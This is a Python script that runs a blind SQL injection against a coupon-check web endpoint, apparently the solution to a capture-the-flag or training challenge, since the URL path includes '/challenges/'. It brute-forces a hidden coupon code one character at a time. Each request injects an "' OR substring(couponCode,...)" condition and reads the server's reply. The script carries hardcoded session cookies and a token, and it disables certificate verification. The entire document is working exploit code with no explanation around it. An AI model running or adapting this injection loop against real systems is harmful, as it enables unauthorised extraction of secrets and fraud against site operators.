import requests
import string


characters = f'{string.digits}{string.ascii_letters}/|<>[.,:;]%$§"()!=?'
url = 'https://172.50.1.5:9443/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck'
coupon = 'spcil/|pse3cr3etcouponstu.f4ru176'
header = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest'
}

cookies = {
    'JSESSIONID': 'D570856A65B0E6AC6274348AD041230F',
    'token': '-67144095444784413795770327667072618483',
    'JSESSIONID3': 'FGDITjs+dL2y71uOrRHd2Q=='
}

while True:
    for char in characters:
        fuzzer_coupon = coupon + char
        sql_q = f"' OR substring(couponCode,1,{len(fuzzer_coupon)}) = '{fuzzer_coupon}"

        data = {
            'couponCode': sql_q
        }

        response = requests.post(url, data=data, headers=header, cookies=cookies, verify=False)
        print(f'{response.text} with: {fuzzer_coupon} at index: {len(fuzzer_coupon)}')

        if '%100' in response.text:
            coupon = fuzzer_coupon
            break
